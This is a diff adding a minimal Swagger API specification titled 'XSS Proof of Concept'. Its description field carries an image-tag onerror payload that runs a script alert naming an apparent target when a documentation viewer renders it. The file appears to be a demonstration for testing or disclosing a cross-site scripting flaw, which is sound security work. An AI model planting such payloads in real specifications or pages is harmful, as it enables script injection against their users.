@@ -1,0 +1,9 @@
+{
+  "swagger": "2.0",
+  "info": {
+    "title": "XSS Proof of Concept",
+    "description": "<img src=x onerror=alert('XSS-TIM-Barmer')>",
+    "version": "1.0.0"
+  },
+  "paths": {}
+}
